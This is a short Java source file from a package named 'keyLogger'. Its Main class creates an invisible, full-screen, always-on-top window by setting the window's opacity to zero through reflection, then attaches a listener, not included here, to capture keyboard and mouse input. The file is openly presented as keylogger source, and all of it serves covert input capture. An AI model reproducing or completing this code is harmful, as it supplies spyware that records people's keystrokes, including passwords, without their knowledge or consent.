package keyLogger;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Window;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import javax.swing.JFrame;

public class Main {

	public static JFrame frame = new JFrame();
	public static Dimension dim;
	public static Robot r;

	public static void main(String[] args) throws ClassNotFoundException,
	SecurityException, NoSuchMethodException, IllegalArgumentException,
	IllegalAccessException, InvocationTargetException, AWTException {
		r = new Robot();
		frame.setVisible(false);
		Toolkit toolkit = Toolkit.getDefaultToolkit();
		dim = toolkit.getScreenSize();
		frame.setBounds(0, 0, (int) dim.getWidth(), (int) dim.getHeight());
		Class<?> awtUtilitiesClass = Class.forName("com.sun.awt.AWTUtilities");
		Method mSetWindowOpacity = awtUtilitiesClass.getMethod(
				"setWindowOpacity", Window.class, float.class);
		mSetWindowOpacity.invoke(null, frame, Float.valueOf(0));
		frame.setAlwaysOnTop(true);
		GenericListener l = new GenericListener();
		frame.addKeyListener(l);
		frame.addMouseListener(l);
	}
}